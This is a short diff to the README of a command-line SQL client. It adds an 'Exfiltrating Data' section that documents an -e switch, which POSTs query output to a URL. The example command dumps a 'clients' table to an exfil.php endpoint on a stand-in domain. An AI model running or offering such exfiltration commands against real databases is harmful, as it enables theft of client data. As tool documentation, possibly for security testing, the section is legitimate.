@@ -70,6 +70,12 @@ SqlClient.exe -d mssql -u root -p PASSWORD -i 127.0.0.1 -c somedb -s "select * f
 ```
 
 ---
+## Exfiltrating Data
+It is possible to exfiltrate data using the -e switch.  This will result in an HTTP POST where the body of the post is the output of the query.
+```
+SqlClient.exe -d mssql -u root -p PASSWORD -i 127.0.0.1 -c somedb -s "select * from clients" -o csv -e http://domain.com/exfil.php
+```
+---
 
 ## Schema Sub-Commands
 
